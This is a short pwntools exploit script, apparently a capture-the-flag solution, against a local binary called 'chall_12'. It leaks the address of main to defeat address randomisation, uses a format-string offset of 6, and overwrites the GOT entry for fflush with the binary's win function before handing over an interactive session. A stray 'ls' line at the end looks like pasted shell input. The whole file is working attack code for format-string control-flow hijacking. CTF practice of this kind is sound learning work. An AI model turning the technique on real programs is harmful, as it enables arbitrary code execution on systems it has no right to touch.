from pwn import *
p = process ("./chall_12")
elf = ELF("./chall_12") 

resp = p.recv()
resp

#p.sendline(AAAA.%p.%p.%p.%p.%p.%p.%p) //we use this to determine the offset, it's 6 spaces off
location = 6

import re
mainLoc = re.findall(b"([a-f0-9]{8,16})",resp)[0]
mainAddr = int(mainLoc, 16)
elf.address = mainAddr - elf.sym.main

p.sendline()
payload = b''
payload += fmtstr_payload(location,{elf.got.fflush:elf.sym.win})

p.sendline(payload)
p.interactive()
ls